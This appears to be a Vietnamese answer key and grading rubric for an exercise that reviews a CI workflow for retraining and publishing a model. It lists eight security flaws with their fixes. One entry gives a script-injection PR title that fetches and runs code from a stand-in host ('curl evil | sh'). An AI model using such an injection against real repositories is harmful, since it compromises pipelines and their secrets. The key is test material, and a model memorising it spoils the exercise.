# Lời giải: rà soát workflow retrain-and-publish

`REVIEW.yaml` cạnh tệp này là một bản mẫu đã chạy qua test; chấm theo lập luận.

## Tám lỗi

| Dòng | Lỗi | Vì sao nguy hiểm | Hướng sửa |
| --- | --- | --- | --- |
| 3 | `pull_request_target` | Chạy trong ngữ cảnh repo gốc: có secrets và token ghi, kể cả với PR từ fork | `pull_request`, hoặc tách workflow không đặc quyền khỏi workflow có đặc quyền |
| 15 | Checkout `head.sha` của PR ở workflow có đặc quyền | Mã người ngoài viết chạy với secrets: đường tấn công kinh điển ("pwn request") | Không checkout head trong workflow đặc quyền |
| 7 | `permissions: write-all` | Token mặc định quyền ghi mọi thứ; lộ một lần là sửa được repo | `contents: read` ở cấp workflow, nâng riêng từng job |
| 17 | `${{ github.event.pull_request.title }}` nhúng vào `run:` | Script injection: tiêu đề `"; curl evil | sh; "` thực thi | Truyền qua `env:` rồi dùng `"$TITLE"` |
| 19 | `curl ... \| bash` | Mã tải về chạy mà không kiểm checksum | Ghim phiên bản, kiểm sha256, hoặc cài từ lockfile có hash |
| 27 | `acme-org/model-publisher@main` | Nhánh thay đổi được: chủ action đẩy mã mới là pipeline chạy mã mới | Ghim commit sha đầy đủ, Dependabot nâng có review |
| 30 | `echo` secret ra log | Che log chỉ khớp nguyên văn; log có phạm vi đọc rộng hơn secret | Không in; truyền qua `env:` |
| 35 | Khoá AWS dài hạn trong secrets | Không hết hạn, không gắn danh tính workflow | OIDC với role giới hạn theo repo, nhánh, environment |

Dòng đúng (không nên báo): `actions/checkout@<sha>` đã ghim đầy đủ; `runs-on: ubuntu-latest`; `needs: retrain`.

## Rubric (100 điểm)

| Tiêu chí | Điểm | Đạt đủ điểm khi |
| --- | --- | --- |
| Bắt đủ lỗi | 30 | 8/8, mỗi lỗi đúng dòng |
| Mức độ | 17 | `high` cho chạy mã PR với đặc quyền, injection và lộ khoá dài hạn; `medium` hợp lý cho phần còn lại, có lý do |
| Kịch bản tấn công | 25 | Mỗi `risk` nêu ai làm gì để lợi dụng, không chỉ tên lỗi |
| Hướng sửa | 20 | Sửa tận gốc (tách đặc quyền, quyền tối thiểu, OIDC) thay vì vá triệu chứng |
| Không báo tràn lan | 10 | Không đánh dấu dòng đã đúng; ưu tiên rõ ràng |

Câu hỏi mở nên tự trả lời: nếu chỉ sửa được ba lỗi trong hôm nay, bạn chọn ba lỗi nào và vì sao? (Gợi ý: lỗi mở đường cho người ngoài
chạy mã với đặc quyền đứng đầu vì nó làm mọi lỗi còn lại dễ khai thác hơn.)
